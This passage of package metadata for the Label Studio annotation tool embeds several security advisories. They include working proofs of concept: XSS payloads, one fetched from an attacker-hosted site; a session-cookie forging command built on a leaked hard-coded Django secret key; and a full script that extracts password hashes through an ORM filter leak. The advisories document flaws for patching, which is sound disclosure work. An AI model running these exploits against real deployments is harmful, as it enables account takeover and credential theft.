file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.6.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.6.0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","google-api-core (==2.10.0)","google-auth (==2.11.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.3)","Django (==3.2.14)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=4.2.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.3.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.44)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.6.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"2863facd486329164424e50549e551ec696aa20374b494a35b27d4137ac4bcc4","md5":"9d28a0062e39e858e6d0aba599e54856","sha256":"9e0cdcd4b2a1d8a07386fcea5c177f3f89da8e9526a6c4389e2cfea8b05bd579"},"downloads":-1,"filename":"label_studio-1.6.0-py3-none-any.whl","has_sig":false,"md5_digest":"9d28a0062e39e858e6d0aba599e54856","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":41785178,"upload_time":"2022-09-27T17:09:28","upload_time_iso_8601":"2022-09-27T17:09:28.412664Z","url":"https://files.pythonhosted.org/packages/28/63/facd486329164424e50549e551ec696aa20374b494a35b27d4137ac4bcc4/label_studio-1.6.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e7f293e85461d95fc05caa5bf62bff93ff80430d91747a441f3b99d5f050de61","md5":"f0e7c302d3d8096c1e6dd62159d131b8","sha256":"ee7867147ce0f705242f93b363c22468925215ae11d3aa27f1d3a775a8305659"},"downloads":-1,"filename":"label-studio-1.6.0.tar.gz","has_sig":false,"md5_digest":"f0e7c302d3d8096c1e6dd62159d131b8","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":40838881,"upload_time":"2022-09-27T17:09:34","upload_time_iso_8601":"2022-09-27T17:09:34.380575Z","url":"https://files.pythonhosted.org/packages/e7/f2/93e85461d95fc05caa5bf62bff93ff80430d91747a441f3b99d5f050de61/label-studio-1.6.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url 